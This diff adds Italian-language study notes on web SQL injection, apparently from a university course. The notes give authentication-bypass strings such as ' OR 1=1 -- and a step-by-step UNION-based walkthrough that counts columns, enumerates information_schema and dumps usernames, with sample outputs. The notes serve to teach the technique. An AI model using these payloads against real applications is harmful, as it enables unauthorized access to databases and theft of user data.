@@ -1,0 +1,65 @@
+## WEB SQL Injection ##
+
+-----------
+-la presenza di un campo di input può essere usato per SQL Inj
+-OBBIETTIVO: sfruttare le query SQL per ottenere informazioni
+-----------
+
+--tornare risultato "VERO":
+
+	' OR 1=1 --
+	
+	(1=1 ritorna sempre vero)
+	(-- commenta il resto della linea di codice)
+
+	a' OR "='
+
+
+----------
+
+--SQL Union based:
+Uso dell'operatore UNION per combinare i risultati delle query
+Immaginiamo che in un applicazione venga eseguita la query:
+
+SELECT id, username, email FROM users WHERE id = 1;
+
+Supponiamo di voler visualizzare i nomi degli utenti nel database...
+
+1) scoprire il numero di colonne
+Iniettare diverse query per scoprire il numero di colonne
+
+	' UNION SELECT NULL #
+	 --> errore!
+
+Riprovo...
+
+	' UNION SELECT NULL,NULL,NULL # 
+	-> nessun errore: 3 colonne
+
+2) sfrutto gli information_schema
+Ovvero schema SQL che contiene informazioni sulla struttura del database
+
+	' UNION SELECT NULL,NULL,schema_name FROM information_schema.schemata #
+	--> scopro quali schema sono sul server
+	#unibo
+
+	' UNION SELECT NULL,NULL,table_name FROM information_schema.tables #
+	--> quali tabelle sono presenta negli schema
+
+	' UNION SELECT NULL,NULL,table_name FROM information_schema.tables WHERE table_name='unibo' #
+	--> nomi delle tabelle di un preciso schema
+	# users
+	# guestbook
+
+	' UNION SELECT NULL,NULL,column_name FROM information_schema.columns WHERE table_name='users' #
+	--> nomi delle colonne della tabella
+	#id
+	#username
+	#email
+
+	' UNION SELECT NULL,NULL,username FROM users #
+	--> ottengo la cercata lista di username
+	#ale
+	#pippo
+
+--------
